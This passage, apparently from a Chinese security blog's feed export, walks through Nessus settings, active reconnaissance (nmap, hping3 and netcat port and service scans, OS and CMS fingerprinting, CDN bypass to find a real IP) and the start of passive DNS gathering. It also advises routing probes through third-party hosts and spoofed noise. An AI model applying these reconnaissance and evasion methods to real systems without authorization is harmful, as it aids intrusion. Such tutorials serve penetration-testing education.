id="扫描模板之凭证"><a href="#扫描模板之凭证" class="headerlink" title="扫描模板之凭证"></a>扫描模板之凭证</h3><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异</p><ol><li><p>云服务：</p><ol><li><p><code>AWS</code>：亚马逊网络服务</p></li><li><p><code>Microsoft Azure</code>：微软基于云计算的操作系统</p></li><li><p><code>Rackspace</code>：全球三大云计算中心之一，是一家全球领先的托管服务器及云计算提供商，公司总部位于美国</p></li><li><p><code>Salesforce.com</code>：<code>Salesforce</code>是处于世界首位的开发<code>CRM</code>客户关系管理平台。软件基于云端，因此用户不需要IT专家团队进行安装设置或管理，只需登陆即可使用</p></li><li><p><code>Red Hat Enterprise Virtualization</code>：红帽企业虚拟化</p></li></ol></li><li><p>数据库：包括<code>MongoDB</code>，<code>Oracle</code>，<code>MySQL</code>，<code>DB2</code>，<code>PostgreSQL</code>和<code>SQL Server</code></p></li><li><p>主机：其中包括<code>Windows</code>登录，<code>SSH</code>和<code>SNMPv3</code></p></li><li><p>其他服务：<code>VMware</code>，<code>Red Hat Enterprise Virtualization</code>等</p></li><li><p>明文身份验证机制：包括<code>FTP</code>，<code>HTTP</code>，<code>POP3</code>和其他服务</p></li></ol><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/10.png" alt="10.png"></p><h3 id="扫描模板之插件"><a href="#扫描模板之插件" class="headerlink" title="扫描模板之插件"></a>扫描模板之插件</h3><p>插件选项可以选择插件系列的安全检查或单个插件检查</p><p>点击插件系列，您可以启用（绿色）或禁用（灰色）整个系列。选择一个系列显示其插件列表。可以启用或禁用单个插件来创建特定的扫描</p><p>禁用某些插件的系列是紫色的，并显示混合，表明只有一些插件已启用。点击插件家族加载完整的插件列表，并允许根据您的扫描偏好细粒度选择</p><p>插件的详细信息包括 摘要，说明，解决方案，插件信息和风险信息</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/122.png" alt="12.png"></p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/13.png" alt="13.png"></p><p>关于 高级 代理服务器 SMTP服务器 自定义CA 密码管理 扫描健康 我的帐户</p><h3 id="设置之关于"><a href="#设置之关于" class="headerlink" title="设置之关于"></a>设置之关于</h3><p>”关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/14.png" alt="14.png"></p><h3 id="设置之高级"><a href="#设置之高级" class="headerlink" title="设置之高级"></a>设置之高级</h3><p>高级设置允许您手动配置全局设置。为了使这些设置生效，可能需要重新启动<code>Nessus</code>服务或服务器。注意:在扫描或策略中配置的设置将覆盖这些值</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/15.png" alt="15.png"></p><h3 id="设置之代理服务器"><a href="#设置之代理服务器" class="headerlink" title="设置之代理服务器"></a>设置之代理服务器</h3><p>代理服务器用于转发<code>HTTP</code>请求。如果您的组织需要一个，<code>Nessus</code>将使用这个代理服务器从可靠的地方获得软件更新。只需要主机和端口字段。如果需要，可以使用用户名、密码、身份验证类型和用户代理</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/16.png" alt="16.png"></p><h3 id="设置之邮件服务"><a href="#设置之邮件服务" class="headerlink" title="设置之邮件服务"></a>设置之邮件服务</h3><p>简单邮件传输协议(<code>SMTP</code>)是发送和接收电子邮件的行业标准。一旦为<code>SMTP</code>配置好，扫描结果将通过电子邮件发送到扫描的“电子邮件通知”配置中指定的收件人列表。这些结果可以通过过滤器定制，并需要一个<code>HTML</code>兼容的电子邮件客户端</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/17.png" alt="17.png"></p><h3 id="设置之自定义CA"><a href="#设置之自定义CA" class="headerlink" title="设置之自定义CA"></a>设置之自定义CA</h3><p>在扫描期间保存自定义证书颁发机构(<code>CA</code>)有助于减轻来自插件#51192 (<code>SSL</code>证书不可信)的发现</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/18.png" alt="18.png"></p><h3 id="设置之密码管理"><a href="#设置之密码管理" class="headerlink" title="设置之密码管理"></a>设置之密码管理</h3><p>密码管理允许您设置密码参数，以及打开登录通知和设置会话超时。登录通知允许用户查看最近一次成功登录、最近一次失败登录尝试(日期、时间和<code>IP</code>)以及自上次成功登录以来是否发生了任何失败的登录尝试。更改将在软重启后生效</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/19.png" alt="19.png"></p><h3 id="设置之扫描健康"><a href="#设置之扫描健康" class="headerlink" title="设置之扫描健康"></a>设置之扫描健康</h3><p>以图表的方式显示<code>NESSUS</code>的运行健康状态</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/20.png" alt="20.png"></p><h3 id="设置之我的账户"><a href="#设置之我的账户" class="headerlink" title="设置之我的账户"></a>设置之我的账户</h3><p>此页面可进行账户密码更改、<code>API</code>密钥生成等</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/21.png" alt="21.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息收集--主动</title>
    <link href="http://yoursite.com/2019/05/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E5%8A%A8/"/>
    <id>http://yoursite.com/2019/05/14/信息收集-主动/</id>
    <published>2019-05-14T15:36:00.000Z</published>
    <updated>2020-03-04T16:18:57.237Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>被动信息收集的结果可能不准确，并不是最新的。利用主动信息收集来进行验证</p><p>流程：</p><p>发现存活主机–&gt;扫描开放端口–&gt;识别端口对应的应用程序–&gt;利用应用程序漏洞–&gt;通过端口攻击进入系统</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ol><li><p>直接与目标进行交互</p></li><li><p>使用代理、第三方受控的计算机进行探测(避免目标系统封堵<code>IP</code>)</p></li><li><p>做好被封<code>IP</code>的准备</p></li><li><p>使用噪声迷惑目标，淹没真实的探测流量(伪造<code>IP</code>迷惑目标，将真实的探测隐于其中)</p></li></ol><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>发现阶段用于识别活着的主机(潜在的攻击目标)</p><h2 id="二层主机发现"><a href="#二层主机发现" class="headerlink" title="二层主机发现"></a>二层主机发现</h2><p>使用协议：<code>ARP</code>协议</p><p>优点：扫描速度快，可靠</p><p>缺点：不可路由，只可发现本网段内的主机，不可跨网段扫描</p><h3 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arping 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/1.png" alt="1.png"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 1.1.1.1</span><br><span class="line"></span><br><span class="line">-sn：ping扫描，禁止端口扫描</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/2.png" alt="2.png"></p><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>专用于二层发现，可用于无线和有线网络，可选择主动或被动探测方式</p><h4 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/3.png" alt="3.png"></p><h4 id="被动探测"><a href="#被动探测" class="headerlink" title="被动探测"></a>被动探测</h4><p>将网卡置于混杂模式，用于嗅探网络中的<code>ARP</code>数据包，根据<code>ARP</code>数据包判断主机是否存活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -p</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/4.png" alt="4.png"></p><h2 id="三层主机发现"><a href="#三层主机发现" class="headerlink" title="三层主机发现"></a>三层主机发现</h2><p>使用协议：<code>IP</code>协议、<code>ICMP</code>协议</p><p>优点：可路由，速度较快</p><p>缺点：速度比二层慢，可能被边界防火墙过滤</p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1.1.1.1 -c 5</span><br></pre></td></tr></table></figure><h3 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/5.png" alt="5.png"></p><h2 id="四层主机发现"><a href="#四层主机发现" class="headerlink" title="四层主机发现"></a>四层主机发现</h2><p>使用协议：<code>TCP</code>协议、<code>UDP</code>协议</p><p>优点：可路由，结果可靠</p><p>缺点：基于状态过滤的防火墙可能过滤扫描</p><h3 id="TCP主机发现"><a href="#TCP主机发现" class="headerlink" title="TCP主机发现"></a>TCP主机发现</h3><p>原理：向主机<code>IP</code>主机发送未经请求的<code>ACK</code>数据包</p><p>若目标<code>IP</code>存在，不论用于探测的端口是否开放，都将返回<code>RST</code>数据包</p><p>若目标<code>IP</code>不存在，将无任何返回</p><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.0/24 -PA80 -sn</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/666.png" alt="6.png"></p><h4 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/9.png" alt="9.png"></p><h3 id="UDP主机发现"><a href="#UDP主机发现" class="headerlink" title="UDP主机发现"></a>UDP主机发现</h3><p>原理：</p><p>若目标存在，用于探测的端口也是开放的，则用于探测的包会一去不复返，无回包</p><p>若目标不存在，则用于探测的包会以取不复返，无回包</p><p>只有目标存在，用于探测的端口是未开放的，目标主机才会返回<code>ICMP</code>端口不可达，以证明目标存在</p><h4 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.0/24 -PU2356 -sn</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/7.png" alt="7.png"></p><h4 id="hping3-1"><a href="#hping3-1" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 --udp 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/8.png" alt="8.png"></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>通过扫描服务器开放端口以及从该端口判断服务器上存在的服务，最常见的工具是<code>nmap</code>，无状态端口扫描工具<code>Masscan</code>、<code>ZMap</code>和御剑高速<code>TCP</code>端口扫描工具</p><h2 id="常见端口及攻击方向"><a href="#常见端口及攻击方向" class="headerlink" title="常见端口及攻击方向"></a>常见端口及攻击方向</h2><h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/20.png" alt="20.png"></p><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/21.png" alt="21.png"></p><h3 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/22.png" alt="22.png"></p><h3 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/23.png" alt="23.png"></p><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/24.png" alt="24.png"></p><h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/25.png" alt="25.png"></p><h3 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/26.png" alt="26.png"></p><h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><h3 id="全连接扫描"><a href="#全连接扫描" class="headerlink" title="全连接扫描"></a>全连接扫描</h3><p>完整进行三次握手过程，结果非常准确，但容易被目标发现</p><h4 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 1.1.1.1 -p 100-200</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/10.png" alt="10.png"></p><h4 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -p 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/11.png" alt="11.png"></p><h3 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h3><p>对目标端口发送<code>SYN</code>数据包</p><p>若目标端口开放，会返回<code>SYN+ACK</code>数据包</p><p>若目标端口未开放，会返回<code>RST</code>数据包</p><h4 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 1.1.1.1 -p 1-100</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/12.png" alt="12.png"></p><h4 id="hping3-2"><a href="#hping3-2" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 1.1.1.1 --scan 1-100 -S</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/13.png" alt="13.png"></p><h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><p>对目标指定端口发送请求</p><p>若目标返回<code>ICMP</code>端口不可达，表示目标端口关闭</p><p>若目标未返回任何数据包，则认为目标端口开放，存在误判</p><h3 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/14.png" alt="14.png"></p><h1 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h1><p>要求：</p><ol><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li></ol><h2 id="获取Banner信息"><a href="#获取Banner信息" class="headerlink" title="获取Banner信息"></a>获取Banner信息</h2><p><code>Banner</code>信息：软件开发商、软件名称、服务类型、版本号</p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 1.1.1.1 53</span><br></pre></td></tr></table></figure><h3 id="dmitry-1"><a href="#dmitry-1" class="headerlink" title="dmitry"></a>dmitry</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -pb 1.1.1.1</span><br></pre></td></tr></table></figure><h3 id="nmap-6"><a href="#nmap-6" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 1.1.1.1 -p 1-100 --script=banner.nse</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/15.png" alt="15.png"></p><h3 id="amap"><a href="#amap" class="headerlink" title="amap"></a>amap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amap -B 1.1.1.1 902</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/16.png" alt="16.png"></p><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><p>根据响应特征分析识别服务：发送一系列复杂的探测，依据响应判断</p><h3 id="nmap-7"><a href="#nmap-7" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.1 -p 1-100 -sV</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/17.png" alt="17.png"></p><h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><h3 id="TTL起始值"><a href="#TTL起始值" class="headerlink" title="TTL起始值"></a>TTL起始值</h3><ol><li><p><code>Windows</code>：128，范围65–128</p></li><li><p><code>Linux/Unix</code>：64，范围1-64</p></li><li><p>某些<code>Unix</code>：255</p></li></ol><h3 id="nmap-8"><a href="#nmap-8" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/18.png" alt="18.png"></p><h3 id="被动分析"><a href="#被动分析" class="headerlink" title="被动分析"></a>被动分析</h3><p>监听网络内数据包，以判断与本机进行数据通信的主机的操作系统类型</p><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/19.png" alt="19.png"></p><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><p>指纹由于终身性、不变性、唯一性和方便性，几乎已经成为生物识别的代名词</p><p>这里指网站<code>CMS</code>指纹识别及<code>web</code>容器的指纹识别等</p><p>应用程序一般在<code>html</code>、<code>js</code>、<code>css</code>等文件中会包含一些特征码，比如<code>wordpress</code>在<code>robots.txt</code>中会包含<code>wp-admin</code>、首页<code>index.php</code>中会包含<code>generator=wordpress 3.xx</code>，这就是<code>CMS</code>指纹</p><p><code>CMS(Content Management System)</code>称为整站系统或文章系统。开发者需提供一个软件包，客户进行安装配置、维护内容就可以</p><p>常见<code>CMS</code>有<code>Dedecms</code>(织梦)、<code>Discuz</code>、<code>PHPWEB</code>、<code>PHPWind</code>、<code>PHPCMS</code>、<code>ECShop</code>、<code>Dvbbs</code>、<code>SiteWeaver</code>、<code>ASPCNMS</code>、帝国、<code>Z-Blog</code>、<code>WordPress</code>等</p><p>常用工具有：御剑<code>whatweb</code>、<code>webrobo</code>、椰树、轻量<code>web</code>指纹识别等</p><p>在线查询<code>CMS</code>指纹网站：</p><ol><li><p><code>BugScaner</code>：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></p></li><li><p>云悉指纹：<a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p></li><li><p><code>WhatWeb</code>：<a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p></li></ol><h1 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h1><p>一般目标网站只有一个域名，但是对应的真实<code>IP</code>有时会很难确定</p><p><code>CDN</code>(内容分发网络)，主要解决因传输距离和不同运营商节点造成的网络速度性能低下问题。就是在一组不同运营商之间的对接节点上的高速缓存服务器，将用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户最近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程服务器上进行响应，可以大大提高网站响应速度及用户体验</p><p>若目标网站使用<code>CDN</code>服务，直接<code>ping</code>域名，得到的不是目标真正<code>IP</code>地址，而只是距离近的<code>CDN</code>服务器</p><h2 id="判断目标是否使用CDN"><a href="#判断目标是否使用CDN" class="headerlink" title="判断目标是否使用CDN"></a>判断目标是否使用CDN</h2><p>利用在线网站<code>17CE</code>(<a href="https://www.17ce.com/)，进行全国多地区的`ping`服务器操作，通过判断各地区的`ping`结果，判断是否使用`CDN`" target="_blank" rel="noopener">https://www.17ce.com/)，进行全国多地区的`ping`服务器操作，通过判断各地区的`ping`结果，判断是否使用`CDN`</a></p><p>若<code>IP</code>地址相同，极可能不存在<code>CDN</code></p><p>若<code>IP</code>大多不一样或规律性很强，可以尝试查询这些<code>IP</code>的归属地，判断是否使用<code>CDN</code></p><h2 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h2><ol><li><p>内部邮箱源。一般邮件系统处于内部，没有经过CDN解析，通过网站用户注册或者<code>RSS</code>订阅功能，查看邮件头中的邮件服务器域名，以此域名获取真实<code>IP</code></p></li><li><p>扫描网站测试文件。如<code>phpinfo</code>、<code>test</code>等</p></li><li><p>分站域名。很多网站主站会使用<code>CDN</code>，但分站可能并没有使用<code>CDN</code>。通过分站域名获取分站<code>IP</code>，可能存在分站与主站不是同一<code>IP</code>，但是属于同一<code>IP</code>段的情况</p></li><li><p>国外访问。国内<code>CDN</code>通常只会针对国内用户提供访问加速。可以通过国外在线代理网站<code>App Synthetic Monitor</code>(<a href="https://asm.ca.com/zh_cn/ping.php" target="_blank" rel="noopener">https://asm.ca.com/zh_cn/ping.php</a>) 访问，可能会获取真实<code>IP</code></p></li><li><p>查询域名解析记录。可能目标网站以前并没有使用<code>CDN</code>，可以通过<code>NETCRAFT</code>(<a href="https://www.netcraft.com/" target="_blank" rel="noopener">https://www.netcraft.com/</a>) 来观察域名的<code>IP</code>历史记录，可以大致分析出目标真实<code>IP</code>段</p></li><li><p>目标网站<code>APP</code>。若目标网站有<code>APP</code>，可以利用<code>Burp Suite</code>抓取<code>APP</code>请求，查找目标真实<code>IP</code></p></li><li><p>绕过<code>CloudFlare CDN</code>查找真实<code>IP</code>。很多网站使用<code>CloudFlare</code>提供<code>CDN</code>服务，可以尝试通过在线网站<code>CloudFlareWatch</code>(<a href="http://www.crimeflare.org:82/" target="_blank" rel="noopener">http://www.crimeflare.org:82/</a>) 对网站进行真实<code>IP</code>查询</p></li></ol><h2 id="验证IP的真实性"><a href="#验证IP的真实性" class="headerlink" title="验证IP的真实性"></a>验证IP的真实性</h2><ol><li><p>查看域名访问与<code>IP</code>访问的页面返回状态是否一致</p></li><li><p>对于<code>IP</code>段，可以批量扫描<code>IP</code>段中开启常见<code>web</code>端口的主机，对其进行访问以判断</p></li></ol><h1 id="收集敏感文件目录"><a href="#收集敏感文件目录" class="headerlink" title="收集敏感文件目录"></a>收集敏感文件目录</h1><p>探测<code>web</code>目录结构和隐藏的敏感文件可以获取网站后台管理界面、文件上传界面，甚至可以获取到网站的源代码</p><p>针对网站目录的扫描有：<code>DirBuster</code>、御剑后台扫描珍藏版、<code>wwwscan</code>、<code>spinder.py</code>、<code>Sensitivefilescan</code>、<code>Weakfilescan</code>等</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息收集--被动</title>
    <link href="http://yoursite.com/2019/05/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/05/14/信息收集/</id>
    <published>2019-05-14T12:26:00.000Z</published>
    <updated>2020-03-04T15:37:50.918Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p><strong>越是了解测试目标，测试的工作越容易</strong></p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ol><li><p>从公开渠道获得目标信息</p></li><li><p>与目标系统不产生直接的交互</p></li><li><p>尽量避免留下一切痕迹</p></li></ol><h1 id="公开资源情报计划"><a href="#公开资源情报计划" class="headerlink" title="公开资源情报计划"></a>公开资源情报计划</h1><p><code>Open source intelligence</code>，简称<code>OSINT</code></p><p>是美国中央情报局(<code>CIA</code>)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报</p><h1 id="被动信息收集内容"><a href="#被动信息收集内容" class="headerlink" title="被动信息收集内容"></a>被动信息收集内容</h1><ol><li><p><code>IP</code>地址段</p></li><li><p>域名、子域名信息</p></li><li><p>邮件地址</p></li><li><p>文档图片数据</p></li><li><p>公司地址</p></li><li><p>公司组织架构</p></li><li><p>联系电话</p></li><li><p>人员姓名/职务</p></li><li><p>公开的商业信息</p></li></ol><h1 id="被动信息收集用途"><a href="#被动信息收集用途" class="headerlink" title="被动信息收集用途"></a>被动信息收集用途</h1><ol><li><p>描述目标</p></li><li><p>社会工程学攻击</p></li><li><p>查找物理缺口</p></li></ol><h1 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>用于域名解析为<code>IP</code>地址</p><p><code>FQDN</code>：完全限定域名，<code>www.baidu.com</code></p><p>域名：<code>baidu.com</code></p><p>域名记录：</p><ol><li><p><code>A</code>记录：主机记录，用于将一个域名解析到一个<code>IP</code>地址上</p></li><li><p><code>C name</code>记录：别名记录，将一个域名解析到另一个域名上</p></li><li><p><code>NS</code>记录：定义和注册域名服务器地址</p></li><li><p><code>MX</code>记录：邮件交换记录</p></li><li><p><code>ptr</code>记录：通过<code>IP</code>地址反向解析域名</p></li><li><p><code>AAAA</code>记录：<code>IPv6</code>下的<code>A</code>记录</p></li></ol><h2 id="域名解析查询"><a href="#域名解析查询" class="headerlink" title="域名解析查询"></a>域名解析查询</h2><h3 id="NSLOOKUP"><a href="#NSLOOKUP" class="headerlink" title="NSLOOKUP"></a>NSLOOKUP</h3><ol><li><p>直接解析</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt; www.baidu.com</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/1.png" alt="1.png"></p></li><li><p>设置查询域名记录类型</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; set q=mx等同于set type=mx</span><br><span class="line">&gt; set q=any</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/2.png" alt="2.png"></p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/3.png" alt="3.png"></p></li><li><p>设置自定义域名服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; server 114.114.114.114</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/4.png" alt="4.png"></p></li><li><p>组合查询</p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/5.png" alt="5.png"></p></li></ol><h3 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h3><ol><li><p>常规查询</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig baidu.com any @114.114.114.114</span><br></pre></td></tr></table></figure><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/6.png" alt="6.png"></p></li><li><p>路由追踪</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +trace www.baidu.com</span><br></pre></td></tr></table></figure><p><img 